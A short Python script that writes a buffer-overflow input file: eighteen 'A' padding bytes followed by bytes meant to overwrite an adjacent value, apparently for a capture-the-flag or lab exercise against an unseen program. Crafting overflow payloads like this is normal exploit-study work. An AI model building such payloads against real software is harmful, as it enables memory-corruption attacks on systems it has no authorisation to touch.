payload = b"A"*18 + b"\x03\x00" + b"\x00\x00"
with open('in.bin', 'wb') as f:
    f.write(payload)